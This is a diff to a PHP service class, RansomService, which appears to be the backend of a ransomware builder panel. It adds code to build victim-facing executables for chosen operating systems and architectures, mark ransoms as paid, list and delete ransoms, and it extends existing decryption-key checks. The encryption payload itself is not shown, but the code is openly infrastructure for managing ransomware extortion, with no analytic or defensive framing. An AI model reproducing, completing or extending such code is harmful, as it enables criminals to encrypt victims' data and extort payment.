@@ -6,12 +6,18 @@ require_once __DIR__ . "/crypto_service.php";
 require_once __DIR__ . "/cipher_service.php";
 require_once __DIR__ . "/../models/cipher/xor_cipher.php";
 require_once __DIR__ . "/../models/ransom.php";
+require_once __DIR__ . "/../models/executable/architecture_type.php";
+require_once __DIR__ . "/../models/executable/system_type.php";
+require_once __DIR__ . "/../models/executable/executable.php";
 
 use Doctrine\ORM\EntityManager;
+use SmallPHP\Models\ArchitectureType;
 use SmallPHP\Models\Cipher;
 use SmallPHP\Models\CipherType;
 use SmallPHP\Models\CryptoType;
+use SmallPHP\Models\Executable;
 use SmallPHP\Models\Ransom;
+use SmallPHP\Models\SystemType;
 use SmallPHP\Models\XORCipher;
 
 class RansomService
@@ -29,7 +35,7 @@ class RansomService
 
     public function get_all_ransoms(): array
     {
-        return array_map(function ($ec) { return $ec->to_array(); }, $this->entity_manager->getRepository(Ransom::class)->findAll());
+        return array_map(function ($ec) { return $ec->to_full_array(); }, $this->entity_manager->getRepository(Ransom::class)->findAll());
     }
 
     public function create_ransom(CryptoType $crypto_id, CipherType $cipher_id): Ransom
@@ -53,6 +59,53 @@ class RansomService
     {
         $encrypted = $this->entity_manager->find(Ransom::class, $id);
         return $encrypted;
+    }
+
+    public function set_paid_ransom(string $id): ?Ransom
+    {
+        $encrypted = $this->entity_manager->find(Ransom::class, $id);
+        if($encrypted === null)
+        {
+            return null;
+        }
+        $encrypted->set_paid(true);
+        $this->entity_manager->flush();
+        return $encrypted;
+    }
+
+    public function get_executables(string $id): ?array
+    {
+        $ransom = $this->entity_manager->find(Ransom::class, $id);
+        if($ransom === null)
+        {
+            return null;
+        }
+
+        return array_map(function ($exe) { return $exe->to_full_array(); }, $ransom->get_executables());
+    }
+
+    public function create_executable(string $id, string $system, string $architecture): void
+    {
+        $ransom = $this->entity_manager->find(Ransom::class, $id);
+        $architecture_type = ArchitectureType::from_string($architecture);
+        $system_type = SystemType::from_string($system);
+
+        if($ransom === null)
+        {
+            throw new \Exception("Ransom not found");
+        }
+
+        $executable = new Executable($ransom, $architecture_type, $system_type);
+        $ransom->add_executable($executable);
+        $this->entity_manager->persist($executable);
+        $this->entity_manager->flush();
+
+        $executable->build();
+    }
+
+    public function get_executable(string $id, string $system, string $architecture)
+    {
+        // TODO: Implement
     }
 
     public function create_premake_ransom(array $params): Ransom
@@ -89,6 +142,18 @@ class RansomService
             return false;
 
         return $encrypted->get_cipher()->get_decryption_key() === $key;
+    }
+
+    public function delete_ransom(int $id): bool
+    {
+        $encrypted = $this->entity_manager->find(Ransom::class, $id);
+
+        if ($encrypted === null)
+            return false;
+
+        $this->entity_manager->remove($encrypted);
+        $this->entity_manager->flush();
+        return true;
     }
 
     public function update_ransom(Ransom $ransom, array $to_edit)
